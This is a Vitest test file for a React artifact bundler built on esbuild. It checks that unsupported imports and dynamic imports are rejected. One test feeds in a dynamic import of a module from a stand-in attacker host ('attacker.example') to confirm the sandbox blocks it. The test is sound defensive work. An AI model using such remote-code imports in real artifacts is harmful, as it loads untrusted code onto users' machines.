// @vitest-environment node

import { build } from "esbuild";
import { describe, expect, it } from "vitest";
import { createReactBuildOptions } from "../../src/renderers/react-build";

describe("React artifact imports", () => {
  it("bundles one component using the fixed React global", async () => {
    const result = await build(
      createReactBuildOptions(`
        import React, { useState } from "react";
        export default function Counter() {
          const [count] = useState(0);
          return <button>{count}</button>;
        }
      `) as Parameters<typeof build>[0],
    );

    expect(result.outputFiles?.[0]?.text).toContain("__PANES_COMPONENT__");
  });

  it("returns a clear error for unsupported imports", async () => {
    await expect(
      build(
        createReactBuildOptions(`
          import thing from "untrusted-package";
          export default function Artifact() { return <div>{thing}</div>; }
        `) as Parameters<typeof build>[0],
      ),
    ).rejects.toThrow(
      'Unsupported React artifact import "untrusted-package". Supported imports: react',
    );
  });

  it("rejects dynamic imports and require calls", async () => {
    await expect(
      build(
        createReactBuildOptions(`
          export default function Artifact() {
            import("https://attacker.example/module.js");
            return <div />;
          }
        `) as Parameters<typeof build>[0],
      ),
    ).rejects.toThrow(
      "Dynamic imports, import.meta, and require() are not supported",
    );
  });
});
